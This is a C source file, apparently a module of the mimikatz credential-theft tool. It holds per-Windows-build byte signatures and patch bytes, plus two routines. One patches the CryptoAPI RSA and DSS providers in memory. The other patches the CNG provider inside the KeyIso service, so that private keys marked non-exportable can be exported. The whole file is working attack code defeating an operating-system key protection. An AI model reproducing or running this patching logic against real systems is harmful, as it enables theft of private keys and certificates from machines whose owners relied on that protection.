/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_crypto_patch.h"

PCP_EXPORTKEY K_RSA_CPExportKey = NULL, K_DSS_CPExportKey = NULL;

BYTE PATC_WIN5_CPExportKey_EXPORT[]	= {0xeb};
BYTE PATC_W6AL_CPExportKey_EXPORT[]	= {0x90, 0xe9};
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x0c, 0x0e, 0x72};
BYTE PTRN_W6AL_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x0c, 0x0e, 0x0f, 0x82};
BYTE PTRN_WIN8_CPExportKey_4000[]	= {0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_W10_1809_CPExportKey_4000[] = {0x0c, 0x00, 0x40, 0x00, 0x00, 0x75};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-4}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W6AL_CPExportKey_4001),	PTRN_W6AL_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 2}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_CPExportKey_4000),	PTRN_WIN8_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_CPExportKey_4000),	PTRN_W10_1809_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
};
BYTE PTRN_WALL_DSS_ExportKey_104[]	= {0x18, 0x04, 0x01, 0x00, 0x00, 0x75};
KULL_M_PATCH_GENERIC CapiDSS104References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_DSS_ExportKey_104),	PTRN_WALL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
};
#elif defined _M_IX86
BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x75};
BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x09, 0x40, 0x0f, 0x84};
BYTE PTRN_WI60_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
BYTE PTRN_WI60_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x0f, 0x85};
BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
KULL_M_PATCH_GENERIC Capi4001References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4001),	PTRN_WI60_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4001),	PTRN_WIN6_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
KULL_M_PATCH_GENERIC Capi4000References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-7}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4000),	PTRN_WI60_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
};
BYTE PTRN_WIN5_DSS_ExportKey_104[]	= {0x10, 0x04, 0x01, 0x75};
BYTE PTRN_W6AL_DSS_ExportKey_104[]	= {0x10, 0x04, 0x01, 0x00, 0x00, 0x75};
KULL_M_PATCH_GENERIC CapiDSS104References[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_DSS_ExportKey_104),	PTRN_WIN5_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 3}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W6AL_DSS_ExportKey_104),	PTRN_W6AL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
};
#endif
NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
{
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
	KULL_M_MEMORY_ADDRESS
		aPattern4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPattern4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatch4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatch4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPattern104Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
		aPatch104Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemoryRSA = {{{K_RSA_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL}, sMemoryDSS = {{{K_DSS_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000, currentReference104;
	
	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
	if(currentReference4001 && currentReference4000)
	{
		aPattern4001Memory.address = currentReference4001->Search.Pattern;
		aPattern4000Memory.address = currentReference4000->Search.Pattern;
		aPatch4001Memory.address = currentReference4001->Patch.Pattern;
		aPatch4000Memory.address = currentReference4000->Patch.Pattern;
		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModule))
		{
			sMemoryRSA.kull_m_memoryRange.size = iModule.SizeOfImage - ((PBYTE) K_RSA_CPExportKey - (PBYTE) iModule.DllBase.address);
			if(	kull_m_patch(&sMemoryRSA, &aPattern4001Memory, currentReference4001->Search.Length, &aPatch4001Memory, currentReference4001->Patch.Length, currentReference4001->Offsets.off0, NULL, 0, NULL, NULL) &&
				kull_m_patch(&sMemoryRSA, &aPattern4000Memory, currentReference4000->Search.Length, &aPatch4000Memory, currentReference4000->Patch.Length, currentReference4000->Offsets.off0, NULL, 0, NULL, NULL))
				kprintf(L"Local CryptoAPI RSA CSP patched\n");
			else PRINT_ERROR_AUTO(L"kull_m_patch(RSA)");
		}
		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
	}
	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), MIMIKATZ_NT_BUILD_NUMBER);
	if(currentReference104)
	{
		aPattern104Memory.address = currentReference104->Search.Pattern;
		aPatch104Memory.address = currentReference104->Patch.Pattern;

		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"dssenh.dll", &iModule))
		{
			sMemoryDSS.kull_m_memoryRange.size = iModule.SizeOfImage - ((PBYTE) K_DSS_CPExportKey - (PBYTE) iModule.DllBase.address);
			if(kull_m_patch(&sMemoryDSS, &aPattern104Memory, currentReference104->Search.Length, &aPatch104Memory, currentReference104->Patch.Length, currentReference104->Offsets.off0, NULL, 0, NULL, NULL))
				kprintf(L"Local CryptoAPI DSS CSP patched\n");
			else PRINT_ERROR_AUTO(L"kull_m_patch(DSS)");
		}
		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
	}
	return STATUS_SUCCESS;
}

BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[]= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x02, 0x0f, 0x84};
BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x0a, 0x0f, 0x84};
BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84};
BYTE PTRN_W10_20H2_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x75, 0x46};
BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.18362.1411
	{KULL_M_WIN_BUILD_10_2004,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.662
	{KULL_M_WIN_BUILD_10_20H2,	{sizeof(PTRN_W10_20H2_SPCryptExportKey),PTRN_W10_20H2_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1620
	{KULL_M_WIN_BUILD_10_21H2,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}}, //ncryptprov.dll 10.0.19041.1202
};
#elif defined _M_IX86
BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84};
BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x0a, 0x0f, 0x84};
BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84};
KULL_M_PATCH_GENERIC CngReferences[] = {
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
};
#endif
NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
{
	NCRYPT_PROV_HANDLE hProvider;
	__try 
	{
		if(NT_SUCCESS(NCryptOpenStorageProvider(&hProvider, NULL, 0)))
		{
			NCryptFreeObject(hProvider);
			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
		}
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
	{
		PRINT_ERROR(L"No CNG\n");
	}
	return STATUS_SUCCESS;
}
